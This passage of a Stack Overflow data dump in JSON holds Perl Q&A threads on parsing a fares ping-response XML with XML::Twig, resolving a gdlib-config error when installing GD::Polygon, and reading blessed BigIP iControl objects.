TimeStamp=\"2016-06-21T00:01:48.191\" Target=\"Test\" Version=\"1.07\" SequenceNmbr=\"1466467309030\" PrimaryLangID=\"en\" RequestorCompanyCode=\"1y\" RequestorNetworkID=\"as\" SetLocation=\"zrh\"&gt;\n &lt;Headers Trailers=\"n\"&gt;\n  &lt;Result xmlns=\"http://schemas.eds.com/transportation/message/fares/common\" status=\"success\" /&gt;\n &lt;/Headers&gt;\n &lt;DataArea&gt;\n  &lt;Pong Message=\"pong\" ServerHostName=\"usclsefam922.clt.travel.eds.com\" ServerPortNumber=\"8024\" ServerMessageCount=\"1\" RegionName=\"preprod\" SystemName=\"preprods3.1\" SystemDate=\"20160621\" SystemTime=\"148\" CodeVersion=\"$Name: build-2016-06-17-1338 $\" /&gt;\n &lt;/DataArea&gt;\n &lt;Trailers /&gt;\n&lt;/com.eds.travel.fares.ping.response&gt; \n</code></pre>\n\n<p>This outputs - as requested:</p>\n\n<pre><code>&lt;com.eds.travel.fares.ping.response\n    EchoToken=\"00c0d1a\"\n    PrimaryLangID=\"en\"\n    RequestorCompanyCode=\"1y\"\n    RequestorNetworkID=\"as\"\n    SequenceNmbr=\"1466467309030\"\n    SetLocation=\"zrh\"\n    Target=\"Test\"\n    TimeStamp=\"2016-06-21T00:01:48.191\"\n    Version=\"1.07\"\n    targetNamespace=\"http://schemas.eds.com/transportation/message/ping/response\"\n    xmlns=\"http://schemas.eds.com/transportation/message/ping/response\"&gt;\n  &lt;Headers Trailers=\"n\"&gt;\n    &lt;Result\n        status=\"success\"\n        xmlns=\"http://schemas.eds.com/transportation/message/fares/common\"\n    /&gt;\n  &lt;/Headers&gt;\n  &lt;DataArea&gt;\n    &lt;Pong\n        CodeVersion=\"$Name: build-2016-06-17-1338 $\"\n        Message=\"pong\"\n        RegionName=\"preprod\"\n        ServerHostName=\"usclsefam922.clt.travel.eds.com\"\n        ServerMessageCount=\"1\"\n        ServerPortNumber=\"8024\"\n        SystemDate=\"20160621\"\n        SystemName=\"preprods3.1\"\n        SystemTime=\"148\"\n    /&gt;\n  &lt;/DataArea&gt;\n  &lt;Trailers/&gt;\n&lt;/com.eds.travel.fares.ping.response&gt;\n</code></pre>\n\n<p>Which is basically all of your XML, less headers and comments. Technically what you asked for, but a bit trivial. Although note the reformatting - reformatting XML is <em>entirely valid</em>. Which is why <code>regex</code> based solutions break. </p>\n\n<p>So how about instead:</p>\n\n<pre><code>#!usr/bin/perl\nuse strict;\nuse warnings;\n\nuse XML::Twig;\n\nmy $twig = XML::Twig -&gt; parsefile ( 'file.txt' ); \n\nforeach my $pong ( $twig -&gt; get_xpath('//Pong' ) ) { \n    foreach my $key( keys %{$pong -&gt; atts} ) { \n        print \"$key =&gt; \", $pong -&gt; att($key),\"\\n\";\n    }\n}\n</code></pre>\n\n<p>Which with your source data, prints:</p>\n\n<pre><code>CodeVersion =&gt; $Name: build-2016-06-17-1338 $\nRegionName =&gt; preprod\nSystemTime =&gt; 148\nServerHostName =&gt; usclsefam922.clt.travel.eds.com\nSystemDate =&gt; 20160621\nSystemName =&gt; preprods3.1\nServerMessageCount =&gt; 1\nServerPortNumber =&gt; 8024\nMessage =&gt; pong\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 6495049, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-ev8_ZXPQHSY/AAAAAAAAAAI/AAAAAAAAD5Y/QiLznL4M-Og/photo.jpg?sz=128", "display_name": "Rajesh Marneedi", "link": "https://stackoverflow.com/users/6495049/rajesh-marneedi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 60, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1466583629, "creation_date": 1466524651, "last_edit_date": 1466536232, "question_id": 37949245, "link": "https://stackoverflow.com/questions/37949245/extract-multiple-lines-of-text-in-xml", "title": "Extract multiple lines of text in XML", "body": "<p>I have an XML as given below. I want to extract the text between <code>&lt;com.eds.travel.fares.ping.response&gt;</code> and <code>&lt;/com.eds.travel.fares.ping.response&gt;</code>. The XML starts with <code>com.eds.travel.fares.ping.response</code> and ends with <code>com.eds.travel.fares.ping.response</code>.</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;  \n&lt;!--This is a Ping Response--&gt;\n&lt;com.eds.travel.fares.ping.response xmlns=\"http://schemas.eds.com/transportation/message/ping/response\" targetNamespace=\"http://schemas.eds.com/transportation/message/ping/response\" EchoToken=\"00c0d1a\" TimeStamp=\"2016-06-21T00:01:48.191\" Target=\"Test\" Version=\"1.07\" SequenceNmbr=\"1466467309030\" PrimaryLangID=\"en\" RequestorCompanyCode=\"1y\" RequestorNetworkID=\"as\" SetLocation=\"zrh\"&gt;\n &lt;Headers Trailers=\"n\"&gt;\n  &lt;Result xmlns=\"http://schemas.eds.com/transportation/message/fares/common\" status=\"success\" /&gt;\n &lt;/Headers&gt;\n &lt;DataArea&gt;\n  &lt;Pong Message=\"pong\" ServerHostName=\"usclsefam922.clt.travel.eds.com\" ServerPortNumber=\"8024\" ServerMessageCount=\"1\" RegionName=\"preprod\" SystemName=\"preprods3.1\" SystemDate=\"20160621\" SystemTime=\"148\" CodeVersion=\"$Name: build-2016-06-17-1338 $\" /&gt;\n &lt;/DataArea&gt;\n &lt;Trailers /&gt;\n&lt;/com.eds.travel.fares.ping.response&gt; \n</code></pre>\n\n<p>I tried with the command below but no luck:</p>\n\n<pre><code>    cat file.txt | egrep \"&lt;com.eds.travel.fares.ping.response&gt;.*&lt;/com.eds.travel.fares.ping.response&gt;\" \n</code></pre>\n\n<p>Please advise.</p>\n"}, {"tags": ["perl", "gd", "cpan", "gdlib"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1466521615, "post_id": 37947772, "comment_id": 63345036, "body": "Is <code>gdlib-config</code> in your <code>PATH</code>?"}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 1, "creation_date": 1466521686, "post_id": 37947772, "comment_id": 63345094, "body": "also... did you try in a new terminal window to ensure PATH was updated accordingly?"}, {"owner": {"reputation": 756, "user_id": 1874054, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b8aca08d3c6bd19ac0edd0ba02f46c4?s=128&d=identicon&r=PG", "display_name": "Floran Gmehlin", "link": "https://stackoverflow.com/users/1874054/floran-gmehlin"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466521850, "post_id": 37947772, "comment_id": 63345233, "body": "@ThisSuitIsBlackNot /usr/local/bin is in my PATH... should I specifically include gdlib-config too ?"}, {"owner": {"reputation": 756, "user_id": 1874054, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b8aca08d3c6bd19ac0edd0ba02f46c4?s=128&d=identicon&r=PG", "display_name": "Floran Gmehlin", "link": "https://stackoverflow.com/users/1874054/floran-gmehlin"}, "edited": false, "score": 0, "creation_date": 1466522062, "post_id": 37947772, "comment_id": 63345376, "body": "mh, I got the error message in my description from running &quot;sudo cpan install GD::Polygon&quot;. When i try without sudo, it does not complain about it anymore but then I get another error message from cpan"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1466522170, "post_id": 37947772, "comment_id": 63345451, "body": "@FloranGmehlin With <code>sudo</code>, you&#39;re running as a different user (root), so the <code>PATH</code> is different. Personally, I would recommend only using your system&#39;s package manager (e.g. yum, apt-get) to install modules in the system perl; use something like perlbrew to install your own local copies of perl."}, {"owner": {"reputation": 756, "user_id": 1874054, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b8aca08d3c6bd19ac0edd0ba02f46c4?s=128&d=identicon&r=PG", "display_name": "Floran Gmehlin", "link": "https://stackoverflow.com/users/1874054/floran-gmehlin"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466522307, "post_id": 37947772, "comment_id": 63345558, "body": "@ThisSuitIsBlackNot oops, forget my last comment, when I run it without sudo, it does try to install it but at the end the message still shows up (was a bit difficult to spot)"}, {"owner": {"reputation": 756, "user_id": 1874054, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b8aca08d3c6bd19ac0edd0ba02f46c4?s=128&d=identicon&r=PG", "display_name": "Floran Gmehlin", "link": "https://stackoverflow.com/users/1874054/floran-gmehlin"}, "reply_to_user": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1466522417, "post_id": 37947772, "comment_id": 63345636, "body": "@stevieb well, I added gdlib-config in the $PATH, but when I open a new Terminal window $PATH is not updated"}, {"owner": {"reputation": 756, "user_id": 1874054, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b8aca08d3c6bd19ac0edd0ba02f46c4?s=128&d=identicon&r=PG", "display_name": "Floran Gmehlin", "link": "https://stackoverflow.com/users/1874054/floran-gmehlin"}, "edited": false, "score": 0, "creation_date": 1466523025, "post_id": 37947772, "comment_id": 63346116, "body": "Ok, it seems that adding gdlib-config to the PATH solved it. Now I have other errors from cpan itself. Thank you guys for your help"}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1466523051, "post_id": 37947772, "comment_id": 63346136, "body": "perhaps try a symlink? <code>sudo ln -s &#47;usr&#47;local&#47;bin&#47;gdlib-config&#47;gdlib-config &#47;usr&#47;local&#47;bin&#47;gdlib-config</code>... nevermind, your comment about it being fixed came up as I entered this comment."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466523125, "post_id": 37947772, "comment_id": 63346183, "body": "@FloranGmehlin Great! Please add an answer showing what you did to solve it so other people with the same problem can see without having to read through all the comments."}, {"owner": {"reputation": 756, "user_id": 1874054, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b8aca08d3c6bd19ac0edd0ba02f46c4?s=128&d=identicon&r=PG", "display_name": "Floran Gmehlin", "link": "https://stackoverflow.com/users/1874054/floran-gmehlin"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466523361, "post_id": 37947772, "comment_id": 63346350, "body": "@ThisSuitIsBlackNot Sure, will do that :) However, another question shows up. The error I mentioned after solving the gdlib thing probably comes from the fact that I need to sudo install it. Now, when I try to sudo install it, it does not find gdlib-config again (even though I added it in the PATH and in ~/.bashrc). any thought ?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466523770, "post_id": 37947772, "comment_id": 63346659, "body": "1) In general, I think it&#39;s best not to install things to the system perl with cpan, which is what you&#39;re trying to do by running <code>sudo cpan</code>; you should either use a package manager like yum, or install a local perl with something like perlbrew. What OS are you running? 2) Your user&#39;s <code>PATH</code> is not the same as root&#39;s <code>PATH</code>, and your <code>.bashrc</code> is not the same as root&#39;s <code>.bashrc</code>."}, {"owner": {"reputation": 756, "user_id": 1874054, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b8aca08d3c6bd19ac0edd0ba02f46c4?s=128&d=identicon&r=PG", "display_name": "Floran Gmehlin", "link": "https://stackoverflow.com/users/1874054/floran-gmehlin"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466524408, "post_id": 37947772, "comment_id": 63347098, "body": "@ThisSuitIsBlackNot I see. I&#39;m running on Linux RHEL7. I actually only need these Libraries to install a software for machine translation... I will not use perl otherwise. Should I still install a local perl ? I also tried with yum but could not manage to install what I needed."}, {"owner": {"reputation": 756, "user_id": 1874054, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b8aca08d3c6bd19ac0edd0ba02f46c4?s=128&d=identicon&r=PG", "display_name": "Floran Gmehlin", "link": "https://stackoverflow.com/users/1874054/floran-gmehlin"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466524653, "post_id": 37947772, "comment_id": 63347265, "body": "@ThisSuitIsBlackNot oh gee. yum indeed did the trick. this cpan brought me more problems than anything else... I will write an answer accordingly, thanks !"}], "answers": [{"comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1466528741, "post_id": 37949336, "comment_id": 63349687, "body": "<code>yum</code> (and <code>apt-get</code>) have an advantage over <code>cpan</code> for Perl modules that need to be integrated with non-Perl libraries, as they can manage the dependencies and install pre-compiled objects that are tested and known to be compatible on your system. You give up the flexibility of working with non-system <code>perl</code>s or modifying the module&#39;s source, if you&#39;re into that sort of thing."}, {"owner": {"reputation": 4155, "user_id": 2006878, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/VepQx.jpg?s=128&g=1", "display_name": "Andrew Newby", "link": "https://stackoverflow.com/users/2006878/andrew-newby"}, "edited": false, "score": 1, "creation_date": 1490711966, "post_id": 37949336, "comment_id": 73228545, "body": "I can&#39;t get this to work with apt-get: <code>apt-get install perl-GD</code>, gives:  E: Unable to locate package perl-GD . I can&#39;t believe how  hard it&#39;s proving to get this server setup, using later versions of Perl :/"}, {"owner": {"reputation": 654, "user_id": 2160447, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/UN45s.jpg?s=128&g=1", "display_name": "Nicorr", "link": "https://stackoverflow.com/users/2160447/nicorr"}, "reply_to_user": {"reputation": 4155, "user_id": 2006878, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/VepQx.jpg?s=128&g=1", "display_name": "Andrew Newby", "link": "https://stackoverflow.com/users/2006878/andrew-newby"}, "edited": false, "score": 4, "creation_date": 1508154458, "post_id": 37949336, "comment_id": 80484359, "body": "@AndrewNewby: You are looking for <code>sudo apt-get install libgd-gd2-perl</code>"}], "tags": [], "owner": {"reputation": 756, "user_id": 1874054, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b8aca08d3c6bd19ac0edd0ba02f46c4?s=128&d=identicon&r=PG", "display_name": "Floran Gmehlin", "link": "https://stackoverflow.com/users/1874054/floran-gmehlin"}, "is_accepted": true, "score": 4, "last_activity_date": 1466527231, "last_edit_date": 1466527231, "creation_date": 1466524926, "answer_id": 37949336, "question_id": 37947772, "link": "https://stackoverflow.com/questions/37947772/why-do-i-get-could-not-find-gdlib-config-in-the-search-path-when-i-try-to-inst/37949336#37949336", "title": "Why do I get &quot;Could not find gdlib-config in the search path&quot; when I try to install GD::Polygon, even though gdlib-config is installed?", "body": "<p>Well, short answer is : I installed GD via <code>yum</code> instead of <code>cpan</code>.</p>\n\n<pre><code>sudo yum install perl-GD\n</code></pre>\n\n<p>If you still want to install it through <code>cpan</code>, you should include <code>gdlib-config</code> on your PATH (not just the folder e.g. <code>/usr/local/bin</code> or wherever it is).</p>\n\n<p>Installing Perl packages with <code>yum</code> is definitively better than with <code>cpan</code></p>\n"}, {"tags": [], "owner": {"reputation": 4969, "user_id": 6337545, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/38da6e07cf159549163a375f14dd654a?s=128&d=identicon&r=PG", "display_name": "Vincent Gerris", "link": "https://stackoverflow.com/users/6337545/vincent-gerris"}, "is_accepted": false, "score": 1, "last_activity_date": 1493392552, "creation_date": 1493392552, "answer_id": 43683590, "question_id": 37947772, "link": "https://stackoverflow.com/questions/37947772/why-do-i-get-could-not-find-gdlib-config-in-the-search-path-when-i-try-to-inst/43683590#43683590", "title": "Why do I get &quot;Could not find gdlib-config in the search path&quot; when I try to install GD::Polygon, even though gdlib-config is installed?", "body": "<p>I agree to go for using the package manager.\nYou do not mention which OS you use.\nOn Ubuntu Linux, /usr/local/bin is also in the path of the root user.\nYou can double check if the file is executable.</p>\n\n<p>Also make sure the script that does the Perl compiling does not mess up the PATH variable.</p>\n\n<p>I am using perlbrew and do not run as root, using cpan to install things.\nNote: on Ubuntu 16.10 and 17.04 gdlib-config is missing, because debian maintainers seem to have removed it.</p>\n\n<p>To get it, you can compile the source here:\n<a href=\"https://launchpad.net/ubuntu/+archive/primary/+files/libgd2_2.1.1.orig.tar.gz\" rel=\"nofollow noreferrer\">https://launchpad.net/ubuntu/+archive/primary/+files/libgd2_2.1.1.orig.tar.gz</a></p>\n\n<p>with the following patch applied:</p>\n\n<pre><code>diff webpimg.c.org libgd-gd-2.1.1-patched-16.10plus/src/webpimg.c\n714c714\n&lt;     vpx_img_wrap(&amp;img, IMG_FMT_I420,\n---\n&gt;     vpx_img_wrap(&amp;img, VPX_IMG_FMT_I420,\n716,721c716,721\n&lt;     img.planes[PLANE_Y] = (uint8*)(Y);\n&lt;     img.planes[PLANE_U] = (uint8*)(U);\n&lt;     img.planes[PLANE_V] = (uint8*)(V);\n&lt;     img.stride[PLANE_Y] = y_stride;\n&lt;     img.stride[PLANE_U] = uv_stride;\n&lt;     img.stride[PLANE_V] = uv_stride;\n---\n&gt;     img.planes[VPX_PLANE_Y] = (uint8*)(Y);\n&gt;     img.planes[VPX_PLANE_U] = (uint8*)(U);\n&gt;     img.planes[VPX_PLANE_V] = (uint8*)(V);\n&gt;     img.stride[VPX_PLANE_Y] = y_stride;\n&gt;     img.stride[VPX_PLANE_U] = uv_stride;\n&gt;     img.stride[VPX_PLANE_V] = uv_stride;\n</code></pre>\n\n<p>cheers</p>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 8963078, "user_type": "registered", "profile_image": "https://graph.facebook.com/515261575508132/picture?type=large", "display_name": "J-C Gibier", "link": "https://stackoverflow.com/users/8963078/j-c-gibier"}, "is_accepted": false, "score": 1, "last_activity_date": 1511021474, "creation_date": 1511021474, "answer_id": 47368164, "question_id": 37947772, "link": "https://stackoverflow.com/questions/37947772/why-do-i-get-could-not-find-gdlib-config-in-the-search-path-when-i-try-to-inst/47368164#47368164", "title": "Why do I get &quot;Could not find gdlib-config in the search path&quot; when I try to install GD::Polygon, even though gdlib-config is installed?", "body": "<p>By the way, it seems that CPAN installer just needs a \"devel\" version of libgd to build the package. I tryed to install it on an old cygwin plateform and finaly it works with the \"libgd-devel\" component.</p>\n"}], "owner": {"reputation": 756, "user_id": 1874054, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5b8aca08d3c6bd19ac0edd0ba02f46c4?s=128&d=identicon&r=PG", "display_name": "Floran Gmehlin", "link": "https://stackoverflow.com/users/1874054/floran-gmehlin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 7695, "favorite_count": 0, "accepted_answer_id": 37949336, "answer_count": 3, "score": 2, "last_activity_date": 1511021474, "creation_date": 1466520703, "last_edit_date": 1466521397, "question_id": 37947772, "link": "https://stackoverflow.com/questions/37947772/why-do-i-get-could-not-find-gdlib-config-in-the-search-path-when-i-try-to-inst", "title": "Why do I get &quot;Could not find gdlib-config in the search path&quot; when I try to install GD::Polygon, even though gdlib-config is installed?", "body": "<p>I'm trying to install <a href=\"https://metacpan.org/pod/GD::Polygon\" rel=\"nofollow\">GD::Polygon</a> by running <code>cpan install GD::Polygon</code>, but I get the following error:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>**UNRECOVERABLE ERROR**\nCould not find gdlib-config in the search path. Please install libgd \n2.0.28 or higher.\n</code></pre>\n\n<p>I manually installed libgd-2.2.1 from source (<code>./configure</code>, <code>make</code>, <code>make install</code>) and now when I run <code>whereis gdlib-config</code>, I see that it is indeed installed:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>gdlib-config: /usr/local/bin/gdlib-config\n</code></pre>\n\n<p>How can I tell <code>cpan</code> where to find this library?</p>\n"}, {"tags": ["arrays", "perl", "big-ip"], "comments": [{"owner": {"reputation": 532, "user_id": 716119, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/64d3d8eb46cc0ed153c42b25a76c131f?s=128&d=identicon&r=PG", "display_name": "SparkeyG", "link": "https://stackoverflow.com/users/716119/sparkeyg"}, "edited": false, "score": 0, "creation_date": 1466518742, "post_id": 37946882, "comment_id": 63342628, "body": "It looks like an array of objects of type &#39;LocalLB::PoolMember::MemberObjectStatus[]&#39; that contains an array of objects of type &#39;LocalLB::PoolMember::MemberObjectStatus&#39;"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1466519395, "post_id": 37946882, "comment_id": 63343194, "body": "Indeed, data structures that have a <code>bless</code> attached to them when dumped with Data::Dumper are objects. If you don&#39;t know what kind of methods those have, use <a href=\"http://p3rl.org/Data::Printer\" rel=\"nofollow noreferrer\">Data::Printer</a>. It will tell you all about the objects, including inheritance, values and the methods it can do. You might need to fiddle with the options to get it to display them at that level of depths, but that&#39;s trivial."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1466520693, "post_id": 37946882, "comment_id": 63344227, "body": "I tried to understand where those classes come from and started reading <a href=\"https://metacpan.org/source/LTP/BigIP-iControl-0.098/lib/BigIP/iControl.pm#L518\" rel=\"nofollow noreferrer\">the source of BigIP::iControl</a>. <b>Careful, maybe this is NSFW!</b>"}, {"owner": {"reputation": 12533, "user_id": 931027, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lWhaB.jpg?s=128&g=1", "display_name": "Kusalananda", "link": "https://stackoverflow.com/users/931027/kusalananda"}, "edited": false, "score": 0, "creation_date": 1466520800, "post_id": 37946882, "comment_id": 63344311, "body": "Do you have access to a BigIP Perl manual? That would tell you how to use the API. The docs says &quot;Unless you feel like playing with Data::Dumper on a rainy Sunday afternoon, consider using get_pool_member_statistics_stringified method.&quot;"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466521018, "post_id": 37946882, "comment_id": 63344508, "body": "I now think those classes all inherit from SOAP::Lite and it&#39;s data object classes somehow. There&#39;s a type map in the source above that very informative yet explicit comment. So those objects should have methods along the lines of <code>get_member</code>, <code>get_object_status</code> or <code>get_status_description</code>."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 12533, "user_id": 931027, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lWhaB.jpg?s=128&g=1", "display_name": "Kusalananda", "link": "https://stackoverflow.com/users/931027/kusalananda"}, "edited": false, "score": 1, "creation_date": 1466521059, "post_id": 37946882, "comment_id": 63344555, "body": "@Kusalananda can you add a link to that quote? That guy is really good at writing entertaining documentation. Never mind. Found it."}, {"owner": {"reputation": 12533, "user_id": 931027, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lWhaB.jpg?s=128&g=1", "display_name": "Kusalananda", "link": "https://stackoverflow.com/users/931027/kusalananda"}, "edited": false, "score": 0, "creation_date": 1466521262, "post_id": 37946882, "comment_id": 63344737, "body": "It&#39;s on the page you linked to yourself. The <code>get_all_pool_member_statistics</code> method is analogous to <code>get_pool_member_statistics</code> it says, and the quote is in the description of that method."}, {"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1466582503, "post_id": 37946882, "comment_id": 63370988, "body": "Whenever you are unsure about the data structure type, use <code>ref</code> in perl. <code>print ref($obj);</code> so that will tell you that this is array and then you know that this is an arrayref, Now you could access the structure with <code>print Dumper($obj-&gt;[0]);</code>"}, {"owner": {"reputation": 590, "user_id": 3147979, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/45cef215ec4357f58f1cc2d5e64b5a68?s=128&d=identicon&r=PG&f=1", "display_name": "Jason Rahm", "link": "https://stackoverflow.com/users/3147979/jason-rahm"}, "edited": false, "score": 0, "creation_date": 1466606448, "post_id": 37946882, "comment_id": 63388868, "body": "some sample code in dealing with the iControl objects is available in the DevCentral codeshare: <a href=\"https://devcentral.f5.com/codeshare\" rel=\"nofollow noreferrer\">devcentral.f5.com/codeshare</a>. A good example for your situation is here: <a href=\"https://devcentral.f5.com/codeshare/enable-disable-pool-member\" rel=\"nofollow noreferrer\">devcentral.f5.com/codeshare/enable-disable-pool-member</a>"}], "answers": [{"tags": [], "owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "is_accepted": true, "score": 1, "last_activity_date": 1466582265, "creation_date": 1466582265, "answer_id": 37961909, "question_id": 37946882, "link": "https://stackoverflow.com/questions/37946882/perl-accessing-and-handling-objects-in-an-array/37961909#37961909", "title": "Perl: Accessing and handling objects in an array", "body": "<p>So you are trying to access the  <code>'availability_status'</code> and <code>'address'</code><br>\nI didn't traverse this whole object but with this code I am able to print the required fields.</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\n\nmy $obj = [\n      [\n        bless( [\n                 bless( {\n                          'member' =&gt; bless( {\n                                             'address' =&gt; '192.168.100.141',\n                                             'port' =&gt; '80'\n                                           }, 'Common::IPPortDefinition' ),\n                          'object_status' =&gt; bless( {\n                                                    'availability_status' =&gt; 'AVAILABILITY_STATUS_GREEN',\n                                                    'status_description' =&gt; 'Pool member is available',\n                                                    'enabled_status' =&gt; 'ENABLED_STATUS_ENABLED'\n                                                  }, 'LocalLB::ObjectStatus' )\n                        }, 'LocalLB::PoolMember::MemberObjectStatus' ),\n                 bless( {\n                          'member' =&gt; bless( {\n                                             'address' =&gt; '192.168.100.142',\n                                             'port' =&gt; '80'\n                                           }, 'Common::IPPortDefinition' ),\n                          'object_status' =&gt; bless( {\n                                                    'availability_status' =&gt; 'AVAILABILITY_STATUS_GREEN',\n                                                    'status_description' =&gt; 'Pool member is available',\n                                                    'enabled_status' =&gt; 'ENABLED_STATUS_ENABLED'\n                                                  }, 'LocalLB::ObjectStatus' )\n                        }, 'LocalLB::PoolMember::MemberObjectStatus' ),\n                 bless( {\n                          'member' 